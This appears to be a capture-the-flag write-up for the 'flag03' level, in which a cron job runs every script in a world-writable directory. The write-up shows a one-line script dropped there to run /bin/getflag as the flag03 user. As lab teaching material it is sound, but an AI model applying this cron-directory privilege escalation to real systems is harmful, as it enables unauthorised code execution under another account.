Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.

In directory /home/flag03 we have:
  - writable.d directory, writable for everyone
  - writable.sh script, that executes scripts from writable.d, code:

	#!/bin/sh
	for i in /home/flag03/writable.d/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done


Our task is to execute getflag as flag03 user. We can prepare a bash script that will call /bin/getflag and get it executed by crontab.

We create exploit.sh in writable.d that looks like this:
/bin/getflag > /home/flag03/out
and we wait for crontab to go off.

After a couple of minutes, we can see our exploit is deleted, and "out" file in /home/flag03 is created.

> cat /home/flag03/out
You have successfully executed getflag on a target account.
